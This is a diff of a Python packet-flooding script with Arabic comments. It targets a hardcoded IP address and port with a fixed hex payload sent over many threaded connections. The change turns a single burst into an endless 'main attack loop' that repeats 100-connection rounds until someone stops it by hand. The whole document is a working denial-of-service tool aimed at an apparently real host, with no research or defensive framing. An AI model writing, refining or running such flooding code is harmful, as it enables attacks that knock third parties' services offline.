@@ -4,8 +4,8 @@ import threading
 # إعدادات الاتصال (تم تحديد IP والمنفذ مسبقًا)
 ip = "5.223.46.86"  # عنوان IP الهدف
 port = 10009  # المنفذ الهدف
-num_connections = 9999  # عدد الاتصالات
-num_send_per_connection = 1000  # عدد الحزم المرسلة لكل اتصال
+num_connections = 100  # عدد الاتصالات في كل دورة
+num_send_per_connection = 100  # عدد الحزم المرسلة لكل اتصال
 
 # الحزمة التي سيتم إرسالها
 packet = bytes.fromhex("F10400010900000001000000F1")
@@ -22,15 +22,18 @@ def send_packets(ip, port, packet, num_send_per_connection):
     except Exception as e:
         print(f"[-] Error: {e}")
 
-# تنفيذ الاتصالات باستخدام Threads
-threads = []
-for _ in range(num_connections):
-    thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
-    threads.append(thread)
-    thread.start()
+# حلقة الهجوم الرئيسية
+try:
+    while True:  # تشغيل مستمر حتى يتم الإيقاف يدويًا
+        threads = []
+        for _ in range(num_connections):
+            thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
+            threads.append(thread)
+            thread.start()
 
-# الانتظار حتى تنتهي جميع الـ Threads
-for thread in threads:
-    thread.join()
+        # الانتظار حتى تنتهي جميع الـ Threads
+        for thread in threads:
+            thread.join()
 
-print("Done sending packets.")
+except KeyboardInterrupt:
+    print("\n[!] Program stopped by user. Exiting...")
